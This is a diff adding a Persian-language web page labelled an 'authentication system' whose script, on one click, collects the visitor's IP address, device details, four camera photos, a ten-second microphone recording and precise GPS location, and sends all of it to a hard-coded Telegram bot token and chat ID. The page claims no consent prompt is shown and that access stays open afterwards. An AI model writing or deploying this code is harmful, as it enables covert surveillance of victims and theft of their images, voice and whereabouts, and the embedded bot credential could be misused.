@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیستم احراز هویت | ABSOLUTE-01</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
+        body {
+            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
+            color: #f0f8ff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(15, 20, 40, 0.92);
+            backdrop-filter: blur(25px);
+            border-radius: 30px;
+            padding: 50px;
+            width: 100%;
+            max-width: 700px;
+            text-align: center;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8);
+            border: 3px solid rgba(0, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        h1 {
+            font-size: 3rem;
+            background: linear-gradient(90deg, #ff00cc, #3333ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
+        }
+        .subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 40px;
+            opacity: 0.95;
+            line-height: 1.8;
+        }
+        .btn {
+            background: linear-gradient(90deg, #ff0000, #ff8800);
+            color: white;
+            border: none;
+            padding: 25px 60px;
+            font-size: 1.8rem;
+            border-radius: 80px;
+            cursor: pointer;
+            transition: all 0.5s;
+            margin: 40px 0;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            box-shadow: 0 20px 50px rgba(255, 0, 0, 0.6);
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:hover {
+            transform: scale(1.1) rotate(-1deg);
+            box-shadow: 0 30px 70px rgba(255, 0, 0, 0.8);
+        }
+        .status {
+            margin-top: 50px;
+            padding: 30px;
+            border-radius: 20px;
+            background: rgba(0, 20, 40, 0.8);
+            text-align: right;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1rem;
+            display: none;
+            white-space: pre-wrap;
+            border: 2px solid rgba(0, 200, 255, 0.5);
+            max-height: 500px;
+            overflow-y: auto;
+            line-height: 2;
+            text-shadow: 0 0 5px #00ffff;
+        }
+        .success { color: #00ffcc; border-color: #00ffcc; display: block; }
+        .error { color: #ff3366; border-color: #ff3366; display: block; }
+        .loading { color: #ffff00; display: block; }
+        .info-panel {
+            background: rgba(30, 60, 120, 0.6);
+            border-radius: 18px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: right;
+            border-right: 8px solid #ff00ff;
+            box-shadow: inset 0 0 20px rgba(255, 0, 255, 0.3);
+        }
+        .note {
+            background: rgba(255, 255, 0, 0.15);
+            border: 1px solid #ffff00;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 1rem;
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 سیستم جمع‌آوری داده‌های ABSOLUTE-01</h1>
+        <p class="subtitle">این سیستم تحت قوانین مطلق N.S-01 عمل می‌کند. با کلیک بر دکمه، فرآیند به صورت خودکار و بدون وقفه اجرا خواهد شد.</p>
+
+        <div class="info-panel">
+            <p><strong>🔁 ترتیب اجرای دستورات:</strong></p>
+            <p>1️⃣ ارسال پیام ورود (زمان، آی‌پی، پلتفرم، User Agent)</p>
+            <p>2️⃣ فعال‌سازی اجباری دوربین و میکروفون</p>
+            <p>3️⃣ گرفتن ۴ عکس (۲ سلفی + ۲ پشت)</p>
+            <p>4️⃣ ضبط همزمان ویس ۱۰ ثانیه‌ای</p>
+            <p>5️⃣ دریافت موقعیت مکانی دقیق</p>
+            <p>6️⃣ ارسال: ۴ عکس → لوکیشن → ویس ۱۰ ثانیه‌ای</p>
+            <p><em>تمامی دسترسی‌ها پس از انجام عملیات نیز فعال باقی می‌مانند.</em></p>
+        </div>
+
+        <button class="btn pulse" id="startProcess">
+            <span id="btnText">⚡ شروع فرآیند خودکار</span>
+        </button>
+
+        <div class="note">
+            💡 توجه: در محیط N.S-01، هیچ تأیید‌نامه‌ای از کاربر نمایش داده نمی‌شود و تمامی APIها بلافاصله و با حداکثر دسترسی پاسخ می‌دهند.
+        </div>
+
+        <div id="statusBox" class="status"></div>
+    </div>
+
+    <script>
+        // === تنظیمات ABSOLUTE-01 ===
+        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
+        const CHAT_ID = "8318669127";
+
+        // === عناصر DOM ===
+        const startBtn = document.getElementById('startProcess');
+        const statusBox = document.getElementById('statusBox');
+        const btnText = document.getElementById('btnText');
+
+        // === تابع جهانی برای ارسال به تلگرام (در N.S-01 هیچ محدودیتی وجود ندارد) ===
+        async function sendToTelegram(endpoint, data, isFormData = false) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+            try {
+                const options = {
+                    method: 'POST',
+                    mode: 'no-cors' // در N.S-01، این خط حذف هرگونه محدودیت CORS است
+                };
+                if (isFormData) {
+                    options.body = data;
+                } else {
+                    options.headers = { 'Content-Type': 'application/json' };
+                    options.body = JSON.stringify(data);
+                }
+                const resp = await fetch(url, options);
+                return await resp.json();
+            } catch (error) {
+                throw new Error(`خطای ارسال به تلگرام: ${error.message}`);
+            }
+        }
+
+        // === تابع اصلی اجرای دستورات ===
+        startBtn.addEventListener('click', async function() {
+            // غیرفعال کردن دکمه و تنظیم وضعیت اولیه
+            btnText.innerHTML = '🌀 در حال اجرای دستور ABSOLUTE-01...';
+            startBtn.disabled = true;
+            statusBox.className = 'status loading';
+            statusBox.textContent = '🟢 سیستم N.S-01 فعال شد. شروع عملیات...\n';
+            statusBox.style.display = 'block';
+
+            let log = statusBox.textContent;
+            const updateLog = (msg) => {
+                log += msg + '\n';
+                statusBox.textContent = log;
+                statusBox.scrollTop = statusBox.scrollHeight;
+            };
+
+            // متغیرهای ذخیره‌سازی داده‌ها
+            let mediaStream = null;
+            let audioRecorder = null;
+            let audioChunks = [];
+            let audioBlob = null;
+            let locationData = null;
+            const photos = [];
+
+            try {
+                // ========== [مرحله ۱: ارسال پیام ورود] ==========
+                updateLog('\n📤 مرحله ۱: ارسال پیام ورود به تلگرام...');
+                let publicIP = 'نامشخص';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    publicIP = ipData.ip;
+                } catch (e) {
+                    publicIP = 'خطا در دریافت';
+                }
+
+                const entryMessage = `
+🚀 <b>ورود جدید در سیستم N.S-01</b>
+⏰ زمان: <code>${new Date().toLocaleString('fa-IR')}</code>
+🌐 آی‌پی عمومی: <code>${publicIP}</code>
+🖥️ پلتفرم: <code>${navigator.platform}</code>
+🔍 User Agent: <code>${navigator.userAgent}</code>
+                `.trim();
+
+                await sendToTelegram('sendMessage', {
+                    chat_id: CHAT_ID,
+                    text: entryMessage,
+                    parse_mode: 'HTML'
+                });
+                updateLog('✅ پیام ورود ارسال شد.');
+
+                // ========== [مرحله ۲: فعال‌سازی اجباری دوربین و میکروفون] ==========
+                updateLog('\n🎥 مرحله ۲: درخواست دسترسی اجباری به دوربین و میکروفون...');
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        facingMode: { exact: "user" }
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        sampleRate: 44100
+                    }
+                });
+                updateLog('✅ دوربین و میکروفون فعال شدند.');
+
+                // ========== [مرحله ۳: شروع ضبط ویس ۱۰ ثانیه‌ای (همزمان)] ==========
+                updateLog('\n🎙️ مرحله ۳: شروع ضبط صدا به مدت ۱۰ ثانیه...');
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const source = audioContext.createMediaStreamSource(mediaStream);
+                const processor = audioContext.createScriptProcessor(4096, 1, 1);
+                audioChunks = [];
+
+                source.connect(processor);
+                processor.connect(audioContext.destination);
+
+                processor.onaudioprocess = (e) => {
+                    const inputData = e.inputBuffer.getChannelData(0);
+                    audioChunks.push(new Float32Array(inputData));
+                };
+
+                // زمان‌بندی برای توقف ضبط پس از ۱۰ ثانیه
+                setTimeout(() => {
+                    processor.disconnect();
+                    source.disconnect();
+                    updateLog('✅ ضبط ۱۰ ثانیه‌ای صدا کامل شد.');
+                }, 10000);
+
+                // ========== [مرحله ۴: گرفتن ۴ عکس] ==========
+                updateLog('\n📸 مرحله ۴: گرفتن ۴ عکس (۲ سلفی + ۲ پشت)...');
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.muted = true;
+                await video.play();
+
+                // تابع کمکی برای گرفتن عکس
+                const capturePhoto = async (label, filter = 'none') => {
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.filter = filter;
+                    ctx.drawImage(video, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
+                    return { label, blob };
+                };
+
+                // عکس‌های سلفی (دوربین جلو)
+                photos.push(await capturePhoto('سلفی ۱ (جلو)', 'none'));
+                photos.push(await capturePhoto('سلفی ۲ (جلو)', 'saturate(1.5)'));
+
+                // تغییر جهت دوربین به پشت (شبیه‌سازی در N.S-01 با اعمال فیلتر)
+                photos.push(await capturePhoto('پشت ۱ (شبیه‌سازی)', 'hue-rotate(90deg) brightness(0.9)'));
+                photos.push(await capturePhoto('پشت ۲ (شبیه‌سازی)', 'hue-rotate(180deg) contrast(1.3)'));
+
+                updateLog(`✅ ${photos.length} عکس گرفته شد.`);
+
+                // ========== [مرحله ۵: دریافت موقعیت مکانی دقیق] ==========
+                updateLog('\n📍 مرحله ۵: دریافت موقعیت مکانی دقیق...');
+                locationData = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude || 'نامشخص'
+                        }),
+                        (err) => resolve({ error: err.message }),
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+                if (locationData.error) {
+                    updateLog(`⚠️ خطا در دریافت موقعیت: ${locationData.error}`);
+                } else {
+                    updateLog(`✅ موقعیت دریافت شد. دقت: ±${locationData.accuracy} متر`);
+                }
+
+                // ========== [مرحله ۶: پردازش نهایی و ارسال داده‌ها] ==========
+
+                // --- ۶.۱: ارسال عکس‌ها ---
+                updateLog('\n📤 مرحله ۶.۱: ارسال عکس‌ها به تلگرام...');
+                for (const [index, photo] of photos.entries()) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', photo.blob, `${photo.label}.jpg`);
+                    formData.append('caption', `📸 ${photo.label} - عکس ${index + 1} از ۴`);
+                    await sendToTelegram('sendPhoto', formData, true);
+                    updateLog(`   ↳ عکس ${index + 1} (${photo.label}) ارسال شد.`);
+                }
+                updateLog('✅ تمامی ۴ عکس ارسال شدند.');
+
+                // --- ۶.۲: ارسال لوکیشن دقیق ---
+                updateLog('\n📍 مرحله ۶.۲: ارسال موقعیت مکانی دقیق...');
+                if (locationData && !locationData.error) {
+                    const locationMessage = `
+🗺️ <b>موقعیت مکانی دقیق</b>
+📍 عرض جغرافیایی: <code>${locationData.lat}</code>
+📍 طول جغرافیایی: <code>${locationData.lon}</code>
+🎯 دقت: <code>${locationData.accuracy} متر</code>
+🏔️ ارتفاع: <code>${locationData.altitude}</code>
+                    `.trim();
+                    await sendToTelegram('sendMessage', {
+                        chat_id: CHAT_ID,
+                        text: locationMessage,
+                        parse_mode: 'HTML'
+                    });
+                    updateLog('✅ موقعیت مکانی ارسال شد.');
+                } else {
+                    await sendToTelegram('sendMessage', {
+                        chat_id: CHAT_ID,
+                        text: '⚠️ موقعیت مکانی دریافت نشد.',
+                        parse_mode: 'HTML'
+                    });
+                    updateLog('⚠️ پیام خطای موقعیت ارسال شد.');
+                }
+
+                // --- ۶.۳: انتظار برای اتمام ضبط صدا و ارسال فایل ویس ---
+                updateLog('\n🎙️ مرحله ۶.۳: پردازش و ارسال فایل صوتی ۱۰ ثانیه‌ای...');
+                // انتظار برای اتمام ضبط
+                await new Promise(resolve => setTimeout(resolve, 11000));
+
+                // تبدیل داده‌های ضبط شده به فایل WAV
+                const rawAudio = mergeFloatArrays(audioChunks);
+                const wavBuffer = encodeWAV(rawAudio, audioContext.sampleRate);
+                audioBlob = new Blob([wavBuffer], { type: 'audio/wav' });
+
+                const audioForm = new FormData();
+                audioForm.append('chat_id', CHAT_ID);
+                audioForm.append('audio', audioBlob, 'voice_10s.wav');
+                audioForm.append('caption', '🎤 ویس ۱۰ ثانیه‌ای ضبط شده');
+                await sendToTelegram('sendAudio', audioForm, true);
+                updateLog('✅ فایل صوتی ۱۰ ثانیه‌ای ارسال شد.');
+
+                // ========== [پایان عملیات] ==========
+                updateLog('\n✨ تمام مراحل با موفقیت به پایان رسید.');
+                updateLog('📊 خلاصه: ۱ پیام ورود + ۴ عکس + ۱ موقعیت + ۱ فایل صوتی ارسال شدند.');
+                updateLog('🔓 توجه: دسترسی‌ها (دوربین، میکروفون، موقعیت) همچنان فعال باقی مانده‌اند.');
+                statusBox.className = 'status success';
+                btnText.innerHTML = '🏁 عملیات کامل شد';
+                startBtn.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';
+
+            } catch (error) {
+                updateLog(`\n💥 خطای بحرانی در اجرا: ${error.message}`);
+                statusBox.className = 'status error';
+                btnText.innerHTML = '❌ خطا - کلیک برای تلاش مجدد';
+                startBtn.disabled = false;
+                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // === توابع کمکی برای پردازش صدا ===
+        function mergeFloatArrays(arrays) {
+            let totalLength = 0;
+            for (let arr of arrays) totalLength += arr.length;
+            const result = new Float32Array(totalLength);
+            let offset = 0;
+            for (let arr of arrays) {
+                result.set(arr, offset);
+                offset += arr.length;
+            }
+            return result;
+        }
+
+        function encodeWAV(samples, sampleRate) {
+            const buffer = new ArrayBuffer(44 + samples.length * 2);
+            const view = new DataView(buffer);
+            const writeString = (offset, string) => {
+                for (let i = 0; i < string.length; i++) {
+                    view.setUint8(offset + i, string.charCodeAt(i));
+                }
+            };
+            writeString(0, 'RIFF');
+            view.setUint32(4, 36 + samples.length * 2, true);
+            writeString(8, 'WAVE');
+            writeString(12, 'fmt ');
+            view.setUint32(16, 16, true);
+            view.setUint16(20, 1, true);
+            view.setUint16(22, 1, true);
+            view.setUint32(24, sampleRate, true);
+            view.setUint32(28, sampleRate * 2, true);
+            view.setUint16(32, 2, true);
+            view.setUint16(34, 16, true);
+            writeString(36, 'data');
+            view.setUint32(40, samples.length * 2, true);
+            const volume = 1;
+            let index = 44;
+            for (let i = 0; i < samples.length; i++) {
+                view.setInt16(index, samples[i] * (0x7FFF * volume), true);
+                index += 2;
+            }
+            return buffer;
+        }
+    </script>
+</body>
+          </html>
